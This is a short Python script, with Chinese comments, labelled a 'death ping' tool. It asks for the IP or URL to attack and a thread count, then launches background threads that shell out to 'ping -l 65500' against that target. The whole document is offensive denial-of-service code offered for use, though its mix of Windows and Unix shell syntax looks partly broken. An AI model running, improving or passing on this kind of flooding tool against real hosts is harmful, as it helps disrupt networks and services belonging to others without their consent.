"""死亡ping  python版本
"""
import threading

# 发起攻击
def death(ip):
    import os
    os.system(f"ping -l 65500 {ip} &>/dev/null 2>&1 &")


####### 主入口
ip = input("请输入你要攻击的IP或url：")
thread_nums = int(input("请指定线程数"))
if thread_nums < 2:
    thread_nums = 2
for index in range(1, thread_nums):
    payload = threading.Thread(target=death, args=(ip,))
    payload.daemon = True
    payload.start()
print("脚本执行完毕~已经在后台运行")